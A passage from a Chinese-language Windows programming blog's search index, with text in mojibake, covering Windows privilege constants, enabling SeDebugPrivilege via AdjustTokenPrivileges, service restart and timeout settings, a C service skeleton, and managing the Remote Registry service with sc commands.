å³å¸¸ç”¨æƒé™å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œå¾®è½¯é€šè¿‡å®å®šä¹‰çš„æ–¹å¼å¯¹ Constants è¿›è¡Œäº†ç½—åˆ—ã€‚å¦‚å¸¸è§ä½¿ç”¨çš„ SeDebugPrivilege å¯¹åº”çš„å®å®šä¹‰å³ä¸º SE_DEBUG_NAMEï¼Œä¸‹è¡¨æ‰€ç¤ºä¸ºå¸¸è§çš„ Constant å¯¹åº”çš„ value å’Œæè¿°ã€‚ Constant/value Description SE_ASSIGNPRIMARYTOKEN_NAMETEXT(â€œSeAssignPrimaryTokenPrivilegeâ€) Required to assign the primary token of a process. User Right: Replace a process-level token. SE_AUDIT_NAMETEXT(â€œSeAuditPrivilegeâ€) Required to generate audit-log entries. Give this privilege to secure servers. User Right: Generate security audits. SE_BACKUP_NAMETEXT(â€œSeBackupPrivilegeâ€) Required to perform backup operations. This privilege causes the system to grant all read access control to any file, regardless of the access control list (ACL) specified for the file. Any access request other than read is still evaluated with the ACL. This privilege is required by the RegSaveKey and RegSaveKeyExfunctions. The following access rights are granted if this privilege is held: READ_CONTROLACCESS_SYSTEM_SECURITYFILE_GENERIC_READFILE_TRAVERSEUser Right: Back up files and directories. If the file is located on a removable drive and the â€œAudit Removable Storageâ€ is enabled, the SE_SECURITY_NAME is required to have ACCESS_SYSTEM_SECURITY. SE_CHANGE_NOTIFY_NAMETEXT(â€œSeChangeNotifyPrivilegeâ€) Required to receive notifications of changes to files or directories. This privilege also causes the system to skip all traversal access checks. It is enabled by default for all users. User Right: Bypass traverse checking. SE_CREATE_GLOBAL_NAMETEXT(â€œSeCreateGlobalPrivilegeâ€) Required to create named file mapping objects in the global namespace during Terminal Services sessions. This privilege is enabled by default for administrators, services, and the local system account. User Right: Create global objects. SE_CREATE_PAGEFILE_NAMETEXT(â€œSeCreatePagefilePrivilegeâ€) Required to create a paging file. User Right: Create a pagefile. SE_CREATE_PERMANENT_NAMETEXT(â€œSeCreatePermanentPrivilegeâ€) Required to create a permanent object. User Right: Create permanent shared objects. SE_CREATE_SYMBOLIC_LINK_NAMETEXT(â€œSeCreateSymbolicLinkPrivilegeâ€) Required to create a symbolic link. User Right: Create symbolic links. **SE_CREATE_TOKEN_NAME**TEXT(â€œSeCreateTokenPrivilegeâ€) Required to create a primary token. User Right: Create a token object. You cannot add this privilege to a user account with the â€œCreate a token objectâ€ policy. Additionally, you cannot add this privilege to an owned process using Windows APIs.Windows Server 2003 and Windows XP with SP1 and earlier: Windows APIs can add this privilege to an owned process. **SE_DEBUG_NAME**TEXT(â€œSeDebugPrivilegeâ€) Required to debug and adjust the memory of a process owned by another account. User Right: Debug programs. **SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME**TEXT(â€œSeDelegateSessionUserImpersonatePrivilegeâ€) Required to obtain an impersonation token for another user in the same session. User Right: Impersonate other users. SE_ENABLE_DELEGATION_NAMETEXT(â€œSeEnableDelegationPrivilegeâ€) Required to mark user and computer accounts as trusted for delegation. User Right: Enable computer and user accounts to be trusted for delegation. SE_IMPERSONATE_NAMETEXT(â€œSeImpersonatePrivilegeâ€) Required to impersonate. User Right: Impersonate a client after authentication. SE_INC_BASE_PRIORITY_NAMETEXT(â€œSeIncreaseBasePriorityPrivilegeâ€) Required to increase the base priority of a process. User Right: Increase scheduling priority. SE_INCREASE_QUOTA_NAMETEXT(â€œSeIncreaseQuotaPrivilegeâ€) Required to increase the quota assigned to a process. User Right: Adjust memory quotas for a process. **SE_INC_WORKING_SET_NAME**TEXT(â€œSeIncreaseWorkingSetPrivilegeâ€) Required to allocate more memory for applications that run in the context of users. User Right: Increase a process working set. **SE_LOAD_DRIVER_NAME**TEXT(â€œSeLoadDriverPrivilegeâ€) Required to load or unload a device driver. User Right: Load and unload device drivers. **SE_LOCK_MEMORY_NAME**TEXT(â€œSeLockMemoryPrivilegeâ€) Required to lock physical pages in memory. User Right: Lock pages in memory. **SE_MACHINE_ACCOUNT_NAME**TEXT(â€œSeMachineAccountPrivilegeâ€) Required to create a computer account. User Right: Add workstations to domain. SE_MANAGE_VOLUME_NAMETEXT(â€œSeManageVolumePrivilegeâ€) Required to enable volume management privileges. User Right: Manage the files on a volume. SE_PROF_SINGLE_PROCESS_NAMETEXT(â€œSeProfileSingleProcessPrivilegeâ€) Required to gather profiling information for a single process. User Right: Profile single process. SE_RELABEL_NAMETEXT(â€œSeRelabelPrivilegeâ€) Required to modify the mandatory integrity level of an object. User Right: Modify an object label. **SE_REMOTE_SHUTDOWN_NAME**TEXT(â€œSeRemoteShutdownPrivilegeâ€) Required to shut down a system using a network request. User Right: Force shutdown from a remote system. SE_RESTORE_NAMETEXT(â€œSeRestorePrivilegeâ€) Required to perform restore operations. This privilege causes the system to grant all write access control to any file, regardless of the ACL specified for the file. Any access request other than write is still evaluated with the ACL. Additionally, this privilege enables you to set any valid user or group SID as the owner of a file. This privilege is required by the RegLoadKey function. The following access rights are granted if this privilege is held: WRITE_DACWRITE_OWNERACCESS_SYSTEM_SECURITYFILE_GENERIC_WRITEFILE_ADD_FILEFILE_ADD_SUBDIRECTORYDELETEUser Right: Restore files and directories. If the file is located on a removable drive and the â€œAudit Removable Storageâ€ is enabled, the SE_SECURITY_NAME is required to have ACCESS_SYSTEM_SECURITY. SE_SECURITY_NAMETEXT(â€œSeSecurityPrivilegeâ€) Required to perform a number of security-related functions, such as controlling and viewing audit messages. This privilege identifies its holder as a security operator. User Right: Manage auditing and security log. SE_SHUTDOWN_NAMETEXT(â€œSeShutdownPrivilegeâ€) Required to shut down a local system. User Right: Shut down the system. SE_SYNC_AGENT_NAMETEXT(â€œSeSyncAgentPrivilegeâ€) Required for a domain controller to use the Lightweight Directory Access Protocol directory synchronization services. This privilege enables the holder to read all objects and properties in the directory, regardless of the protection on the objects and properties. By default, it is assigned to the Administrator and LocalSystem accounts on domain controllers. User Right: Synchronize directory service data. SE_SYSTEM_ENVIRONMENT_NAMETEXT(â€œSeSystemEnvironmentPrivilegeâ€) Required to modify the nonvolatile RAM of systems that use this type of memory to store configuration information. User Right: Modify firmware environment values. SE_SYSTEM_PROFILE_NAMETEXT(â€œSeSystemProfilePrivilegeâ€) Required to gather profiling information for the entire system. User Right: Profile system performance. SE_SYSTEMTIME_NAMETEXT(â€œSeSystemtimePrivilegeâ€) Required to modify the system time. User Right: Change the system time. SE_TAKE_OWNERSHIP_NAMETEXT(â€œSeTakeOwnershipPrivilegeâ€) Required to take ownership of an object without being granted discretionary access. This privilege allows the owner value to be set only to those values that the holder may legitimately assign as the owner of an object. User Right: Take ownership of files or other objects. **SE_TCB_NAME**TEXT(â€œSeTcbPrivilegeâ€) This privilege identifies its holder as part of the trusted computer base. Some trusted protected subsystems are granted this privilege. User Right: Act as part of the operating system. **SE_TIME_ZONE_NAME**TEXT(â€œSeTimeZonePrivilegeâ€) Required to adjust the time zone associated with the computerâ€™s internal clock. User Right: Change the time zone. SE_TRUSTED_CREDMAN_ACCESS_NAMETEXT(â€œSeTrustedCredManAccessPrivilegeâ€) Required to access Credential Manager as a trusted caller. User Right: Access Credential Manager as a trusted caller. SE_UNDOCK_NAMETEXT(â€œSeUndockPrivilegeâ€) Required to undock a laptop. User Right: Remove computer from docking station. **SE_UNSOLICITED_INPUT_NAME**TEXT(â€œSeUnsolicitedInputPrivilegeâ€) Required to read unsolicited input from a terminal device. User Right: Not applicable. 0x02 ç”¨æ³• valueä¸åŒï¼Œå¯¹åº”çš„æ“ä½œå’Œæƒé™ä¹Ÿä¸åŒï¼Œæœ¬æ–‡åˆ—ä¸¾äº†æœ‰å…³ Privilege Constants çš„ä¸€äº›ä½¿ç”¨æ–¹å¼ã€‚ LookupPrivilegeValue æŸ¥æ‰¾æƒé™ æŸ¥æ‰¾æƒé™ 1234567891011BOOL EnablePrivilege()&#123; LUID PrivilegeRequired ; BOOL bRes = FALSE; bRes = LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;PrivilegeRequired); // ... return bRes;&#125; AdjustTokenPrivileges ä¿®æ”¹æƒé™ 123456789101112131415161718192021222324inline BOOL CToolhelp::EnablePrivilege(PCTSTR szPrivilege, BOOL fEnable) &#123; // Enabling the debug privilege allows the application to see // information about service applications BOOL fOk = FALSE; // Assume function fails HANDLE hToken; // Try to open this process&#x27;s access token if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123; // Attempt to modify the given privilege TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; LookupPrivilegeValue(NULL, szPrivilege, &amp;tp.Privileges[0].Luid); tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0; AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL); fOk = (GetLastError() == ERROR_SUCCESS); // Don&#x27;t forget to close the token handle CloseHandle(hToken); &#125; return(fOk);&#125;","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"æƒé™ä¸ä¼šè¯","slug":"æƒé™ä¸ä¼šè¯","permalink":"https://hodlyounger.github.io/tags/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æƒé™ä¸ä¼šè¯","slug":"A-OS/Windows/æƒé™ä¸ä¼šè¯","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"ã€æœåŠ¡ã€‘windowsæœåŠ¡ç¨‹åºå´©æºƒåè‡ªåŠ¨æ‹‰èµ·","date":"2023-10-27T01:24:02.058Z","path":"A_OS/Windows/æœåŠ¡/ã€æœåŠ¡ã€‘windowsæœåŠ¡ç¨‹åºå´©æºƒåè‡ªåŠ¨æ‹‰èµ·/","text":"æ¦‚è¿°ï¼šwindowsæœåŠ¡ç¨‹åºå´©æºƒåè‡ªåŠ¨æ‹‰èµ· [toc] windowsæœåŠ¡ç¨‹åºå´©æºƒåè‡ªåŠ¨æ‹‰èµ· Windows æ“ä½œç³»ç»Ÿä¸­çš„æœåŠ¡ç¨‹åºå´©æºƒåè‡ªåŠ¨é‡æ–°å¯åŠ¨æ˜¯ç”±æ“ä½œç³»ç»Ÿçš„æœåŠ¡æ§åˆ¶ç®¡ç†æœºåˆ¶å†³å®šçš„ã€‚è¿™ä¸ªæœºåˆ¶ç¡®ä¿å…³é”®çš„ç³»ç»ŸæœåŠ¡èƒ½å¤ŸæŒç»­è¿è¡Œï¼Œå³ä½¿åœ¨å‘ç”Ÿé”™è¯¯æˆ–å¼‚å¸¸æƒ…å†µä¸‹ä¹Ÿèƒ½å¤Ÿè‡ªåŠ¨è¿›è¡Œæ¢å¤ã€‚ ä¸‹é¢æ˜¯ä¸€äº›å¯èƒ½å¯¼è‡´æœåŠ¡ç¨‹åºå´©æºƒåè‡ªåŠ¨é‡æ–°å¯åŠ¨çš„åŸå› ï¼š æœåŠ¡æ¢å¤é€‰é¡¹è®¾ç½®ï¼šWindows æ“ä½œç³»ç»Ÿæä¾›äº†æœåŠ¡æ¢å¤é€‰é¡¹ï¼Œå…è®¸ä½ ä¸ºæ¯ä¸ªæœåŠ¡å®šä¹‰ç‰¹å®šçš„æ¢å¤è¡Œä¸ºã€‚è¿™åŒ…æ‹¬å¯åŠ¨æœåŠ¡ã€é‡æ–°å¯åŠ¨æœåŠ¡å’Œé‡‡å–å…¶ä»–æ“ä½œï¼Œå¦‚è¿è¡Œè„šæœ¬æˆ–å‘é€è­¦æŠ¥ã€‚é€šè¿‡é…ç½®è¿™äº›é€‰é¡¹ï¼Œä½ å¯ä»¥æŒ‡å®šæœåŠ¡å´©æºƒåçš„è¡Œä¸ºï¼Œä»¥å®ç°è‡ªåŠ¨é‡æ–°å¯åŠ¨ã€‚ æ•…éšœå›æ”¶ç®¡ç†å™¨ï¼šWindows æœåŠ¡æ§åˆ¶ç®¡ç†å™¨ï¼ˆSCMï¼‰è´Ÿè´£ç›‘æ§å’Œç®¡ç†è¿è¡Œåœ¨æ“ä½œç³»ç»Ÿä¸­çš„æœåŠ¡ã€‚SCM åŒ…å«ä¸€ä¸ªæ•…éšœå›æ”¶ç®¡ç†å™¨ï¼ˆFailure Recovery Managerï¼‰ï¼Œå®ƒä¼šæ£€æµ‹æœåŠ¡å´©æºƒäº‹ä»¶ï¼Œå¹¶æ ¹æ®é¢„å®šä¹‰çš„è§„åˆ™è‡ªåŠ¨è§¦å‘æ¢å¤æ“ä½œã€‚è¿™äº›è§„åˆ™å¯ä»¥æŒ‡å®šåœ¨å‘ç”Ÿæ•…éšœæ—¶è‡ªåŠ¨é‡æ–°å¯åŠ¨æœåŠ¡ã€‚ æœåŠ¡ä¾èµ–å…³ç³»ï¼šåœ¨ Windows ç³»ç»Ÿä¸­ï¼ŒæœåŠ¡å¯ä»¥å®šä¹‰å®ƒä»¬æ‰€ä¾èµ–çš„å…¶ä»–æœåŠ¡ã€‚å½“ä¸€ä¸ªæœåŠ¡å´©æºƒåï¼Œå¦‚æœå®ƒçš„ä¾èµ–æœåŠ¡è¿˜æ­£å¸¸è¿è¡Œï¼Œé‚£ä¹ˆæ“ä½œç³»ç»Ÿä¼šè‡ªåŠ¨é‡æ–°å¯åŠ¨å´©æºƒçš„æœåŠ¡ï¼Œä»¥ä¿æŒæ•´ä¸ªç³»ç»Ÿçš„ç¨³å®šæ€§å’Œè¿ç»­æ€§ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒæœåŠ¡ç¨‹åºå´©æºƒåè‡ªåŠ¨æ‹‰èµ·å¹¶ä¸ä¸€å®šæ€»æ˜¯é€‚ç”¨äºæ‰€æœ‰æœåŠ¡ã€‚æŸäº›æœåŠ¡å¯èƒ½ä¼šé…ç½®æˆåœ¨å´©æºƒååœç•™åœ¨é”™è¯¯çŠ¶æ€ï¼Œå¹¶ç­‰å¾…æ‰‹åŠ¨å¹²é¢„æˆ–å…¶ä»–ç‰¹å®šæ¡ä»¶æ‰ä¼šé‡æ–°å¯åŠ¨ã€‚ æ€»ä¹‹ï¼ŒWindows æ“ä½œç³»ç»Ÿé€šè¿‡æœåŠ¡æ§åˆ¶ç®¡ç†æœºåˆ¶æ¥ç¡®ä¿å…³é”®æœåŠ¡çš„è¿ç»­è¿è¡Œï¼Œä½¿å…¶å…·å¤‡è‡ªåŠ¨æ¢å¤èƒ½åŠ›ã€‚è¿™ç§è¡Œä¸ºé€šè¿‡æœåŠ¡æ¢å¤é€‰é¡¹ã€æ•…éšœå›æ”¶ç®¡ç†å™¨å’ŒæœåŠ¡ä¾èµ–å…³ç³»ç­‰æœºåˆ¶æ¥å®ç°ã€‚","tags":[{"name":"windows/æœåŠ¡","slug":"windows-æœåŠ¡","permalink":"https://hodlyounger.github.io/tags/windows-%E6%9C%8D%E5%8A%A1/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æœåŠ¡","slug":"A-OS/Windows/æœåŠ¡","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9C%8D%E5%8A%A1/"}]},{"title":"ã€æœåŠ¡ã€‘ä¿®æ”¹windowsæœåŠ¡çš„å¯åŠ¨ç­‰å¾…æ—¶é—´","date":"2023-10-27T01:24:02.055Z","path":"A_OS/Windows/æœåŠ¡/ä¿®æ”¹WindowsæœåŠ¡çš„å¯åŠ¨ç­‰å¾…æ—¶é—´/","text":"æ¦‚è¿°ï¼šä¿®æ”¹windowsæœåŠ¡å¯åŠ¨ç­‰å¾…æ—¶é—´ å½“è°ƒè¯•WindowsæœåŠ¡çš„å¯åŠ¨ä»£ç æ—¶ï¼ŒæœåŠ¡ç»å¸¸å› ä¸ºé•¿æ—¶é—´æ²¡æœ‰å“åº”è€Œè¢«Windowså…³é—­ã€‚ ä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½®æ³¨å†Œè¡¨é¡¹ï¼šHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ServicesPipeTimeoutã€‚ Windowsç”¨è¿™ä¸ªå€¼å°±æ˜¯æ¥å†³å®šServiceå¯åŠ¨è¶…æ—¶çš„æ—¶é—´ã€‚ å€¼ç±»å‹ä¸º dword ç±»å‹ã€‚ ps: åœ¨Controlä¸‹å»ºç«‹ä¸€ä¸ªdwordç±»å‹çš„å­—æ®µï¼Œæ”¹åä¸ºï¼šServicesPipeTimeoutï¼Œè®¾ç½®ä¸€ä¸ªæ¯”è¾ƒå¤§çš„æ—¶é—´ï¼Œ90000 ç­‰ã€‚é»˜è®¤ä¸º30000ã€‚å•ä½æ˜¯æ¯«ç§’ã€‚","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"Windows/æœåŠ¡","slug":"Windows-æœåŠ¡","permalink":"https://hodlyounger.github.io/tags/Windows-%E6%9C%8D%E5%8A%A1/"},{"name":"Windows/service","slug":"Windows-service","permalink":"https://hodlyounger.github.io/tags/Windows-service/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æœåŠ¡","slug":"A-OS/Windows/æœåŠ¡","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9C%8D%E5%8A%A1/"}]},{"title":"ã€æœåŠ¡ã€‘windows åˆ›å»ºæœåŠ¡","date":"2023-10-27T01:24:02.054Z","path":"A_OS/Windows/æœåŠ¡/WindowsæœåŠ¡è¿›ç¨‹/","text":"æ¦‚è¿°ï¼šwindowsæ“ä½œç³»ç»Ÿåˆ›å»ºæœåŠ¡å®ä¾‹ è¯´æ˜ è°ƒç”¨çš„ç›¸å…³ç³»ç»ŸAPIï¼š CreateService StartServiceCtrlDispatcher RegisterServiceCtrlHandlerEx ä»£ç  ä½¿ç”¨æ—¶è¿›éœ€è¦ä¿®æ”¹ MyServiceName å³å¯ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#include &lt;windows.h&gt;#include &lt;tchar.h&gt;#include &lt;strsafe.h&gt;#define MyServiceName TEXT(&quot;MyService&quot;)bool g_bPausedFlag = false;HANDLE g_hSvcStopEvent = NULL;SERVICE_STATUS g_MyServiceStatus;SERVICE_STATUS_HANDLE g_hMyServiceStatusHandle;void __stdcall MyServiceMain(DWORD dwArgc, LPTSTR *lpszArgv);DWORD __stdcall MyServiceHandlerEx(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext);void ReportServiceStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint);DWORD MyServiceInitialization(DWORD dwArgc, LPTSTR *lpszArgv);DWORD MyServiceWorker(DWORD dwArgc, LPTSTR *lpszArgv);int _tmain(int argc, TCHAR* argv[])&#123; SERVICE_TABLE_ENTRY dispatchTable[] = &#123; &#123;MyServiceName, (LPSERVICE_MAIN_FUNCTION)MyServiceMain&#125;, &#123;NULL, NULL&#125; &#125;; if (!StartServiceCtrlDispatcher(dispatchTable)) &#123; // cleaning worker &#125; return 0;&#125;void __stdcall MyServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)&#123; g_hSvcStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL); g_hMyServiceStatusHandle = RegisterServiceCtrlHandlerEx(MyServiceName, (LPHANDLER_FUNCTION_EX)MyServiceHandlerEx, NULL); if (g_hMyServiceStatusHandle == NULL) return; g_MyServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; g_MyServiceStatus.dwServiceSpecificExitCode = 0; ReportServiceStatus(SERVICE_START_PENDING, 0, 0); DWORD dwRet = MyServiceInitialization(dwArgc, lpszArgv); if (dwRet != NO_ERROR) ReportServiceStatus(SERVICE_STOPPED, dwRet, 0); ReportServiceStatus(SERVICE_RUNNING, 0, 0); MyServiceWorker(dwArgc, lpszArgv); while (true) &#123; WaitForSingleObject(g_hSvcStopEvent, INFINITE); ReportServiceStatus(SERVICE_STOPPED, 0, 0); return; &#125;&#125;DWORD __stdcall MyServiceHandlerEx(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext)&#123; switch (dwControl) &#123; case SERVICE_CONTROL_SHUTDOWN: case SERVICE_CONTROL_STOP: ReportServiceStatus(SERVICE_STOP_PENDING, 0, 0); SetEvent(g_hSvcStopEvent); break; case SERVICE_CONTROL_PAUSE: ReportServiceStatus(SERVICE_PAUSE_PENDING, 0, 0); g_bPausedFlag = true; break; case SERVICE_CONTROL_CONTINUE: ReportServiceStatus(SERVICE_CONTINUE_PENDING, 0, 0); g_bPausedFlag = false; break; case SERVICE_CONTROL_INTERROGATE: break; default: break; &#125; return 0;&#125;// æ‰§è¡Œä¸€äº›åˆå§‹åŒ–è¿‡ç¨‹DWORD MyServiceInitialization(DWORD dwArgc, LPTSTR *lpszArgv)&#123; return NO_ERROR;&#125;// æœåŠ¡å·¥ä½œæ‰§è¡Œå‡½æ•°DWORD MyServiceWorker(DWORD dwArgc, LPTSTR *lpszArgv)&#123; return 0;&#125;// å‘æœåŠ¡æ§åˆ¶ç®¡ç†å™¨æŠ¥å‘ŠçŠ¶æ€ä¿¡æ¯void ReportServiceStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint)&#123; static DWORD dwCheckPoint = 1; g_MyServiceStatus.dwCurrentState = dwCurrentState; g_MyServiceStatus.dwWin32ExitCode = dwWin32ExitCode; g_MyServiceStatus.dwWaitHint = dwWaitHint; if (dwCurrentState == SERVICE_START_PENDING) g_MyServiceStatus.dwControlsAccepted = 0; else g_MyServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE; if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED)) g_MyServiceStatus.dwCheckPoint = 0; else g_MyServiceStatus.dwCheckPoint = dwCheckPoint++; SetServiceStatus(g_hMyServiceStatusHandle, &amp;g_MyServiceStatus);&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æœåŠ¡","slug":"A-OS/Windows/æœåŠ¡","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9C%8D%E5%8A%A1/"}]},{"title":"ã€æœåŠ¡ã€‘Retmote Registry æœåŠ¡","date":"2023-10-27T01:24:02.046Z","path":"A_OS/Windows/æœåŠ¡/ã€æœåŠ¡ã€‘RemoteRegistry/","text":"Remote Registryæ˜¯ä»€ä¹ˆæœåŠ¡ï¼Ÿ Remote Registry,ç¿»è¯‘ä¸º&quot;è¿œç¨‹æ³¨å†Œè¡¨&quot;,å¦‚æœè¿œç¨‹çš„è®¡ç®—æœºè¿æ¥åˆ°äº†ä½ çš„è®¡ç®—æœºé‚£ä¹ˆä»–å¯ä»¥é€šè¿‡å­—ç¬¦ç•Œé¢æˆ–è€…å…¶ä»–æ–¹å¼è¿œç¨‹ä¿®æ”¹æ³¨å†Œè¡¨.è¿™æ˜¯ä¸€ä¸ªç›¸å½“ä¸¥é‡çš„æ¼æ´,å¯ä»¥ä¸ºé»‘å®¢å…¥ä¾µæä¾›æ—©æœŸçš„æ–¹ä¾¿(ä¿®æ”¹æŸäº›é¡¹ç›®ä¾¿äºå…¥ä¾µ,æ¯”å¦‚æ“ä½œç³»ç»Ÿç‰ˆæœ¬). [toc] 1. å¼€å¯ Remote Regustiy æœåŠ¡ é»˜è®¤æƒ…å†µä¸‹ï¼ŒWindows 7 ç¦ç”¨è¿œç¨‹æ³¨å†Œè¡¨æœåŠ¡ï¼ˆå¯èƒ½æ˜¯å‡ºäºå®‰å…¨åŸå› ï¼‰ã€‚ 1.1. æ–¹æ³•1 ui æ‰“å¼€windowsæœåŠ¡ï¼Œåœ¨æœåŠ¡ä¸­ä¿®æ”¹ Remote Registry æœåŠ¡çš„å¯åŠ¨ç±»å‹ä¸ºæ‰‹åŠ¨ï¼Œç„¶åå¯åŠ¨ Remote Registry æœåŠ¡ã€‚ 1.2. æ–¹æ³•2 å‘½ä»¤è¡Œ è¦ä»å‘½ä»¤è¡Œå¯ç”¨å®ƒï¼Œè¯·é”®å…¥ä»¥ä¸‹å†…å®¹ï¼š 1sc \\\\computername config remoteregistry start= auto ç¡®ä¿ = ç¬¦å·å’Œ auto ä¹‹é—´æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œ å¦‚æœæ‚¨åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šæ‰§è¡Œæ­¤æ“ä½œï¼Œæ‚¨å¯ä»¥åˆ é™¤ \\computername éƒ¨åˆ†ï¼Œ æ‚¨ä¹Ÿå¯ä»¥å°†â€œremoteregistryâ€æ›¿æ¢ä¸ºå¦ä¸€ä¸ªæœåŠ¡æ¥å¯ç”¨æˆ–ç¦ç”¨å®ƒã€‚ å¯ç”¨è¯¥æœåŠ¡åï¼Œæ‚¨å¯ä»¥é‡æ–°å¯åŠ¨è®¡ç®—æœºï¼Œæˆ–è€…ç«‹å³ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨å®ƒï¼š 1sc \\\\computername start remoteregistry ä½¿ç”¨pså·¥å…· 1sc start remoteregistry start= auto å¯åŠ¨æœåŠ¡å¹¶å°†å…¶è®¾ç½®ä¸ºè‡ªåŠ¨ ä¸éœ€è¦å¯åŠ¨æœåŠ¡ 2. Remote RegistryæœåŠ¡å¯ä»¥å…³é—­å—ï¼Ÿ å› æ­¤å…³é—­è¿™ä¸ªæœåŠ¡æ²¡æœ‰ä»€ä¹ˆå®³å¤„,è€Œç›Šå¤„å¾ˆå¤š.å¼ºçƒˆå»ºè®®å…³é—­,å¹¶ä¸”ç¦ç”¨.å¦å¤–ç³»ç»Ÿä¸­æ²¡æœ‰å…¶ä»–æœåŠ¡æ˜¯ä¾èµ–æˆ–è€…è·Ÿæ­¤æœåŠ¡æœ‰å…³è”çš„ï¼Œæ‰€ä»¥ç¦ç”¨ä¹‹åä¸ä¼šå¯¹å…¶ä»–æœåŠ¡äº§ç”Ÿå½±å“ã€‚ Remote RegistryæœåŠ¡å…³é—­æ–¹æ³•ï¼š 1ã€æŒ‰ä½é”®ç›˜çš„â€œWin+Râ€å¿«æ·ç»„åˆé”®ï¼Œæ‰“å¼€â€œè¿è¡Œâ€å¯¹è¯å‘½ä»¤çª—å£ï¼Œè¾“å…¥â€œservices.mscâ€å‘½ä»¤ï¼Œç‚¹å‡»â€œç¡®å®šâ€ï¼›ï¼Œå¦‚å›¾ï¼š 2ã€æ‰“å¼€æœåŠ¡ç•Œé¢åæ‰¾åˆ°â€œRemote Registryâ€é€‰é¡¹ï¼Œå¹¶å·¦é”®åŒå‡»æ‰“å¼€å…¶å±æ€§å¯¹è¯çª—å£ï¼› 3ã€åœ¨æ‰“å¼€çš„â€œRemote Registry çš„å±æ€§â€å¯¹è¯çª—å£ä¸­ï¼Œåœ¨å¯åŠ¨ç±»å‹é€‰é¡¹ä¸­é€‰æ‹©â€œç¦ç”¨â€é€‰é¡¹ï¼Œå†ç‚¹å‡»â€œåº”ç”¨â€â€“â€œåœæ­¢â€â€“â€œç¡®å®šâ€æŒ‰é’®ä¿å­˜è®¾ç½®å³å¯è§£å†³é—®é¢˜ã€‚ ä»¥ä¸Šå°±æ˜¯Remote RegistryæœåŠ¡çš„è¯¦ç»†ä»‹ç»äº†ï¼Œå°ç¼–å¼ºçƒˆå»ºè®®å…³é—­æ­¤æœåŠ¡ï¼Œå› ä¸ºæ³¨å†Œè¡¨æ˜¯ä¸€å°ç”µè„‘çš„æ ¸å¿ƒæ•°æ®åº“ï¼Œæˆ‘ä»¬å¿…é¡»ä¿è¯è‡ªå·±æ ¸å¿ƒæ•°æ®åº“çš„å®‰å…¨ã€‚","tags":[{"name":"Windows/æ³¨å†Œè¡¨","slug":"Windows-æ³¨å†Œè¡¨","permalink":"https://hodlyounger.github.io/tags/Windows-%E6%B3%A8%E5%86%8C%E8%A1%A8/"},{"name":"Windows/registry","slug":"Windows-registry","permalink":"https://hodlyounger.github.io/tags/Windows-registry/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æœåŠ¡","slug":"A-OS/Windows/æœåŠ¡","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9C%8D%E5%8A%A1/"}]},{"title":"windows å·¥å…·é›†","date":"2023-10-27T01:24:02.035Z","path":"A_OS/Windows/å·¥å…·/å·¥å…·é›†/","text":"æŸ¥çœ‹ OLE/COM å¯¹è±¡ OLE/COM Object Viewer PEview.exe äºŒè¿›åˆ¶æŸ¥çœ‹ PE æ–‡ä»¶ Viewdll.exe æŸ¥çœ‹dllå¯¼å‡ºæ¥å£ã€å¼•ç”¨å‡½æ•° exeinfo.exe 